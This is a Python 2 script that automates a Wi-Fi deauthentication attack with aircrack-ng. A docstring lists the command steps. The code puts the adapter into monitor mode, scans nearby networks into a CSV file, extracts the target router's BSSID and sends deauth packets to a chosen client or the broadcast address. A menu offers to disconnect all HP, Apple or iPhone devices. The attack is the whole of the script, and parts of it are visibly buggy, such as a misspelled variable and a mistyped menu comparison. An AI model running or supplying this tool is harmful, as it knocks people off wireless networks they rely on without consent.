import os
import subprocess
import csv

"""
Commands that are run through cdi from aircrack install to deauthorization
1.)sudo apt install aircrack-ng (installs the aircrack libs)
2.)iwconfig 
    (checks to see if wifi adapter is connected)
3.)airmon-ng check kill 
    (kills processes that might interfere with the attack)
4.)airmon-ng start wlan0 
    (puts wifi adapter into monitor mode)
5.)airodump-ng wlan0mon
    (shows any wifi connections that are found
6.)airodump-ng wlan0mon [router bssid] --channel [router channel] 
    (shows only connections going to a specific router through a specific channel)
7.) aireplay-ng --deauth 0 -c [device mac address] -a routers mac address] wlan0mon
    (sends deauthorization packets to the device that you want to kick off)
"""

#step 0: installs aircrack if not already in the system
installAirmonCmd = "sudo apt install aircrack-ng"
os.system(installAirmonCmd)

#step 1: get the adapter name to prepare airodump-ng
wifiAdapter = raw_input("what is the name of your wifi adapter?\n")
print "your wifi adapter is", wifiAdapter
print "NOTE: some network features may be deactivated to ensure that this program is able to deauthorize correctly."

#step 2: kills programs that may interfere with the attack process
airmonCheck = subprocess.Popen(['airmon-ng','check','kill'])
airodumpOut = ""
try:
    airodumpOut, errs = airmonCheck.communicate()
except:
    airmonCheck.kill() #if program fails, kill process and dump to stdout and stderr
    airodumpOut, errs = airmonCheck.communicate()
#print "completed check kill" #Debug

#step 3: converts adapter to monitor mode
#Monitor mode allows the adapter to read traffic through the air domain
monitorMode = subprocess.Popen(['airmon-ng','start',wifiAdapter])
airStartOut = ""
try:
    airStartOut, errs = monitorMode.communicate()
except:
    monitorMode.kill()
    airStartOut, errs = monitorMode.communicate()
#print "start completed" #Debug

#step 3: output wireless info to a csv file
#Stores info from the air domain into a csv file
wifiScan = subprocess.Popen(['airodump-ng','-w','airodumpFile','--output-format','csv','wlan0mon'])
csvOut = "" 
try:
    csvOut, errs = wifiScan.communicate(timeout=15)
except:
    wifiScan.kill()
    csvOut, errs = wifiScan.communicate()
#print "csv file made", csv #Debug

#step 4: gets the name of the wifi you'd like to attack
wifiName = raw_input("What is the name of the wifi you would like to deauthorize on?")
print "your wifi name is ", wifiName

#step 5: scans csv file and gets the BSSID (MAC of the router)
wifiRow = ""
BSSID = ""
with open('airodumpFile-01.csv','r') as csvfile:
    readCSV = csv.reader(csvfile, delimiter='\n')
    for row in readCSV:
	if len(row) > 0:
           if wifiName in row[0]:
	      print "wifi name is found"
              wifiRow = row[0]
              break;
BSSID = wifiRow[:17] #gets the first 17 characters, AKA the bssid
print "your BSSID is ",BSSID #Debug


#step 6: runs a broadcast attack on that BSSID
#might need to iwconfig to the right channel if there are any issues here
#set an option to see how many times the user wants to send deauthorizations

#Mac Address ranges for certain types of machines
#Ranges do not work as intended, consider this protion deprecated.
testVictimBSSID = "FF:FF:FF:FF:FF:FF"
testHpRange =     "0C:96:E6*"
testAppleRange =  "AC:DE:48*"
testiPhoneRange = "F8:38:80*"
finalBSSID = ""

#inserts the given option
victimChoice = raw_input("Which host would you like to kick? 1.)Test Victim 2.)All HPs 3.)All MBPs, 4.)All iPhones")
if victimChoice == 1:
   finalBSSID = testVictimBSSID
elif victimChoice == 2:
   finalBSSID = testHpRange
elif victimChoice == 3:
   finalBSSID = tetsAppleRange
elif victimChoice == 4:
   finalBSSID = testiPhoneRange
else:
   print("invalid choice, selecting test victim instead")
   finalBSSID = testVictimBSSID 
	
#puts your adapter into the right channel
os.system("iwconfig wlan0mon channel 1")

#proceeds with deauth attack, sends 50 segments of 64 packets to both router and victim.
attack = subprocess.Popen(['aireplay-ng', '--deauth', '50', '-a', BSSID,'-c',finalBSSID, 'wlan0mon'])
try:
    print "now attacking"
    #outs, errs = attack.communicate(timeout=20)
except:
    print "attack failed"
    attack.kill()
    outs, errs = attack.communicate()
